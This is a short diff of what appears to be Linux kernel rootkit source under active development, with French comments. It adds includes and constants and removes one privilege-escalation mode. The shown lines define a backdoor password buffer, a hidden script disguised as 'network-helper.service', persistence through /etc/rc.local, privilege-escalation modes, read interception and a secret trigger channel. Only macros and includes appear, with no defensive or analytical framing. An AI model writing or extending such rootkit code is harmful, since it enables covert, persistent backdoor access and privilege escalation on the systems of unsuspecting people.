@@ -28,6 +28,8 @@
 #include <linux/pid.h>
 #include <linux/kthread.h>
 #include <linux/umh.h>
+#include <linux/mutex.h>
+#include <linux/in.h>
 #endif
 
 #define RK_MAGIC 'R'
@@ -36,11 +38,12 @@
 #define HIDDEN_SCRIPT "network-helper.service"
 #define RK_MSG_MAX 256
 #define BACKDOOR_PASS_MAX 32
+#define MAX_READ_INTERCEPT 65536
+
 /* chemin du fichier de persistance sur ta LFS */
 #define PERSIST_FILE "/etc/rc.local"
 
 /* Types de privilèges */
-#define RK_PRIVESC_BY_PID  0
 #define RK_PRIVESC_BY_CMD  1
 
 /* chemin du fichier trigger pour le canal de comm secondaire */
